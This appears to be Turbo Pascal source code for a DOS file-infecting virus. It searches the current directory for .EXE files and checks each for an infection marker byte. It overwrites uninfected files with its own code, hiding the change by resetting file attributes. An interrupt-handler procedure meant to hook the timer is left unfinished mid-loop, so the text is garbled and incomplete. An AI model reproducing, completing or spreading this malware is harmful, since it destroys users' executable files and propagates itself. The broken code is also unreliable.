uses crt, dos;
var
  int08 : pointer;
  buffer : array[1..5488] of byte;
  bufferx : char;
  drive : string[1];
  source, dest : file;
  curdir : string;
  srec : searchrec;
  rec, position : integer;
  theattr, attr : word;

procedure virus_int(flags, cs, ip, ax, bx, cx, dx,
                    si, di, ds, es, bp : word);interrupt;
   begin
    asm
     PUSHF
     CALL int08
    end;
      while not activated do
       begin


begin

     getdir(0, curdir);
     drive := curdir;
      if curdir = (drive + ':\') then
       curdir := curdir else curdir := curdir + '\';
     assign(source, paramstr(0));
      findfirst('*.EXE', anyfile, srec);
       while doserror = 0 do
         begin
          assign(dest, curdir + srec.name);
          getfattr(dest, attr);
          setfattr (dest, 0);
          reset(dest, 1);
           seek(dest, 13);
             blockread(dest, bufferx, sizeof(bufferx), rec);
               if bufferx = '¥' then
                begin
                  setfattr(dest, attr);
                  findnext(srec);
                end else
          begin
           getfattr(source, theattr);
           setfattr(source, 0);
           reset(source, 1);
            blockread(source, buffer, sizeof(buffer), rec);
             seek(dest, 0);
                  blockwrite(dest, buffer, rec);
             close(source);
            setfattr(source, theattr);
            close(dest);
            setfattr(dest, attr);
            halt;
           end;
          end;
end.